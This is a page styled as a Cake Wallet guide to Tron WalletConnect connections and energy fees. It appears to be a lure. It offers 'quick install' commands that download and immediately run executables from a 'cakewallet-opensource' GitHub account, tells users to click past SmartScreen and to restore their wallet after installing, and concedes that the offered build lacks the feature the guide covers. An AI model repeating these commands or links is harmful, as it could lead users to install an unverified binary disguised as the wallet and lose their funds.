![Cake Wallet tron walletconnect guide](assets/cake-wallet-tron-walletconnect-article-banner.png)

# Connect a Tron dApp With Cake Wallet WalletConnect

What the connector allows, which build has it, and the energy trap.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Tron dApp connections through WalletConnect arrived in a later build than the desktop release published here. On a build that supports it, open the Tron wallet, start the WalletConnect session, and approve the connection on your device. Energy, not bandwidth, is what makes a Tron USDT send fail.

<!-- ARTICLE-BODY-BEGIN -->

## Install the build that added it
The connector is the newest part of Tron support and it depends entirely on your version. The desktop build on this page predates it, so the option will not appear there however long you look.

Install the newer build from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and check the Tron wallet for the connector before assuming the feature is absent from the product.

## What can be connected
WalletConnect sessions expose an address and a signing prompt to a dApp. The wallet does not give the dApp your keys; every action is a request you approve, and you can end the session at any time.

Scope matters: the connector is evidenced for Tron, not as a general-purpose bridge to every chain. A dApp on another network is a different integration, whatever a listing claims.

## Before you connect
Check the wallet has the token the dApp expects and enough of the native coin to pay fees. A session that connects to an empty Tron wallet can approve a transaction that then fails on cost.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md">Add custom tokens</a> covers the display side, which is the usual reason a dApp reports a zero balance for a wallet that holds the token.

## Approving a transaction
Every request appears as a prompt with details: what contract, what amount, what it costs. Read it before approving, and decline anything you did not initiate. The wallet cannot reverse an approved transaction afterwards.

Ending the session is the right end to any dApp visit. A session left open keeps the connection available to that site.

## The energy trap
Tron charges energy for contract calls, and a USDT transfer is a contract call. If you have not staked TRX for energy, the network burns TRX from your balance instead, which can exceed the amount you are sending for a small transfer.

Renting energy is the alternative to staking it, and the app supports sending with rented energy where the build includes it. A send that fails with "out of energy" means the energy was not there when the transaction executed, not that the balance is wrong.

## Moving Tron stablecoins
Bridging keeps you on the same asset across chains; a swap changes the asset on one chain. Both appear in the same wallet, and the Tron side has its own fees for each.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md">Bridge USDT between chains</a> explains the destination token problem, which is where a successful bridge can still look like a failure.

## What the wallet can hold
Tron support includes TRX and TRC-20 tokens, with the same rule as other networks: the token needs adding before it appears.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Supported coins and networks</a> lists the whole set, so you can tell whether a missing token or a missing network is the issue.

## FAQ
### How do I connect a Tron dApp?
From the Tron wallet, start a WalletConnect session and approve the connection on your device.
### Why does a Tron USDT send fail with out of energy?
The contract call needs energy or burnt TRX, and the available balance could not cover it. Stake, rent energy, or top up TRX.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[add custom tokens](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-custom-tokens.md) · [supported coins and networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [bridge USDT between chains](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-usdt-bridge.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
